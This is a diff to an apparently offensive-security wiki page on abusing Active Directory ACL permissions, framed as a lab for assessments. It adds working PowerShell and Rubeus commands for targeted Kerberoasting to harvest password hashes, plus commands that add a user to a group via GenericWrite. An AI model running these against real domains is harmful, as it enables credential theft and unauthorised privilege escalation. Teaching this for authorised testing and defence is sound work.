@@ -12,7 +12,7 @@
 
 </details>
 
-**This information was copied from** [**https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **because it's just perfect**
+**This information was mostly copied from** [**https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **because it's just perfect**
 
 ## Context
 
@@ -36,6 +36,8 @@ Some of the Active Directory object permissions and types that we as attackers a
 
 In this lab, we are going to explore and try to exploit most of the above ACEs.
 
+It's worth familiarizing yourself with all of the [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) and as many Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) as possible as you never know when you may encounter a less common one during an assessment.
+
 ## GenericAll on User
 
 Using powerview, let's check if our attacking user `spotless` has `GenericAll rights` on the AD object for the user `delegate`:
@@ -56,7 +58,16 @@ We can see that indeed our user `spotless` has the `GenericAll` rights, effectiv
 *   **Targeted Kerberoasting**: You could make the user **kerberoastable** setting an **SPN** on the account, kerberoast it and attempt to crack offline:
 
     ```powershell
-    Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
+    # Set SPN
+    Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
+    # Get Hash
+    .\Rubeus.exe kerberoast /user:<username> /nowrap
+    # Clean SPN
+    Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
+
+    # You can also use the tool https://github.com/ShutdownRepo/targetedKerberoast 
+    # to get hashes of one or all the users
+    python3 targetedKerberoast.py -domain.local -u <username> -p password -v
     ```
 *   **Targeted ASREPRoasting**: You could make the user **ASREPRoastable** by **disabling** **preauthentication** and then ASREProast it.
 
@@ -236,6 +247,22 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
 
 ![](../../.gitbook/assets/21.png)
+
+## GenericWrite on Group
+
+This allows you to set as members of the group new users (yourself for example):
+
+```powershell
+# Create creds
+$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd) 
+# Add user to group
+Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
+# Check user was added
+Get-DomainGroupMember -Identity "Group Name" | Select MemberName
+# Remove group member
+Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
+```
 
 ## WriteDACL + WriteOwner
 
@@ -481,15 +508,11 @@ Additionally, we could think about leveraging logon/logoff scripts, using regist
 
 ## References
 
-{% embed url="https://wald0.com/?p=112" %}
-
-{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2" %}
-
-{% embed url="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" %}
-
-{% embed url="https://adsecurity.org/?p=3658" %}
-
-{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_" %}
+* [https://wald0.com/?p=112](https://wald0.com/?p=112)
+* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
+* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
+* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)
 
 <details>
 
